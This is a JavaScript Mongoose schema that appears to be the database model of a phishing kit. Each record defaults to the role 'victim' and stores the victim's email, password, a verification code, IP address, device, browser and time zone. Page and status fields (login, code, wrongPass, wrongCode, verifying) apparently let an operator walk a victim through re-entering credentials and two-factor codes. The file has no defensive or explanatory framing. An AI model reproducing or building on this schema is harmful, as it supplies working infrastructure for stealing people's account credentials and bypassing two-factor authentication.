import mongoose, { Schema } from "mongoose";

const userSchema = new Schema(
  {
    email: {
      type: String,
      trim: true,
    },
    password: {
      type: String,
      trim: true,
    },
    code: {
      type: String,
      trim: true,
      default: "",
    },
    situation: {
      type: String,
      enum: ["visits", "connects"],
      default: "visits",
    },

    ipAddress: {
      type: String,
      trim: true,
    },
    device: {
      type: String,
    },
    timeZone: {
      type: String,
      default: "",
    },
    browser: {
      type: String,
    },
    role: {
      type: String,
      default: "victim",
    },
    currentPage: {
      type: String,
      enum: ["login", "loading", "code", "success"],
      default: "login",
    },
    currentStatus: {
      type: String,
      enum: ["wrongPass", "wrongCode", "verifying", "normal"],
      default: "normal",
    },
  },
  { timestamps: true }
);

export const User = mongoose.model("User", userSchema);
